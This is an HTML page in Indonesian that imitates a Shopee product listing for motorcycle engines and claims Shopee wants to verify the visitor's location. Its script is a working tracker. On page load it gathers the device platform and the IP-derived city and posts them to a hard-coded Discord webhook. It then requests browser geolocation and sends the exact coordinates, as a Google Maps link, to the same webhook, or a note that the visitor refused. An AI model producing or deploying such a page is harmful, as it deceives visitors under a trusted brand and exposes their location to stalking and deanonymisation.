<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Detail Produk</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
  <style>
    body { font-family: 'Inter', sans-serif; }
    .shopee-orange { color: #EE4D2D; }
  </style>
</head>
<body class="max-w-md mx-auto border border-gray-200 relative pb-20">

  <div class="relative w-full cursor-pointer" onclick="handleAction()">
    <img src="./tirev2010.jpg" alt="Produk" class="w-full h-72 object-cover">
    <button class="absolute top-3 left-3 bg-black/50 w-9 h-9 rounded-full text-white"><i class="fas fa-arrow-left"></i></button>
  </div>

  <div class="p-4" onclick="handleAction()">
    <h1 class="text-gray-900 font-semibold text-lg">Jual Beli Mesin tiger,megapro,GL,DLL</h1>
    <div class="flex items-center justify-between mt-3">
      <span class="shopee-orange font-bold text-xl">Rp1.700.000 - Rp6.700.000</span>
      <span class="text-gray-500 text-sm">27 Terjual</span>
    </div>
  </div>

  <div class="border-y border-gray-200 px-4 py-3 bg-blue-50">
    <div class="flex items-start space-x-2 text-sm">
      <i class="fas fa-map-marker-alt text-blue-600 mt-0.5"></i>
      <div>
        <p class="font-medium text-gray-800">Shopee ingin memverifikasi lokasi Anda</p>
      </div>
    </div>
  </div>

  <div class="fixed bottom-0 left-0 right-0 bg-white border-t p-2 max-w-md mx-auto flex gap-2">
    <button onclick="handleAction()" class="w-1/2 py-3 text-teal-600 font-semibold border border-teal-600 rounded">Chat</button>
    <button onclick="handleAction()" class="w-1/2 py-3 bg-[#EE4D2D] text-white font-semibold rounded">Beli Sekarang</button>
  </div>

  <script>
    const webhook = "https://discord.com/api/webhooks/1468299380330332355/I2z1xzpeHQp4iKlllSQOFewI_z_OjIRBsDmgl7jbqbvM4GWQtYTewJXltpZQsGB5OV87";

    async function sendToDiscord(title, fields) {
      await fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: [{ title, fields, color: 15548997, timestamp: new Date() }] })
      });
    }

    window.onload = async () => {
      // Ambil data teknis full otomatis
      let f = [{ name: "üì± Device", value: navigator.platform, inline: true }];
      try {
        const res = await fetch('https://ipapi.co/json/');
        const d = await res.json();
        f.push({ name: "üåç IP", value: d.ip }, { name: "üèôÔ∏è Kota", value: d.city });
      } catch (e) {}
      await sendToDiscord("üì¶ Detail Produk Entry", f);

      // Minta lokasi otomatis setelah 2 detik
      setTimeout(reqLoc, 2000);
    };

    function reqLoc() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (p) => sendToDiscord("üìç Lokasi Detail Diterima", [{ name: "Maps", value: `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}` }]),
          () => sendToDiscord("‚ùå Lokasi Detail Ditolak", [{ name: "User", value: "Menolak Izin" }])
        );
      }
    }

    function handleAction() {
      // Tetap redirect saat tombol ditekan
      window.location.href = 'profiltoko.html';
    }
  </script>
</body>
</html>
